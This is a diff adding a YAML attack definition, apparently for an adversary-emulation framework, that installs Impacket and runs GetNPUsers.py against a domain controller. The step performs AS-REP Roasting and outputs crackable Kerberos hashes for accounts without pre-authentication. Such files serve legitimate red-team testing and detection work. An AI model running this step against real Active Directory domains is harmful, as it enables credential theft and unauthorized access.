@@ -1,0 +1,40 @@
+---
+api_version: 2.0
+uuid: a7c2e8f4-6d3b-4e5a-8f1c-9a0b7d6e5c4f
+name: AS-REP Roasting Attack
+authors:
+  - isaac_fletcher
+description: |
+  Performs an AS-REP Roasting attack against a user with Kerberos pre-authentication disabled.
+  Uses Impacket's GetNPUsers.py to request an AS-REP ticket and output a crackable hash.
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1558 Steal or Forge Kerberos Tickets
+  subtechniques:
+    - T1558.004 AS-REP Roasting
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: target_user
+    description: The username of the vulnerable account to attack (without domain prefix)
+steps:
+  - name: setup_impacket
+    description: Install impacket
+    ttp: //utils/pip-install/ttp.yaml
+    args:
+      modules: "impacket"
+
+  - name: asrep_roast
+    description: Request AS-REP ticket for the target user
+    inline: |
+      GetNPUsers.py "{{.Args.domain}}/{{.Args.target_user}}" -dc-ip "{{.Args.dc}}" -no-pass
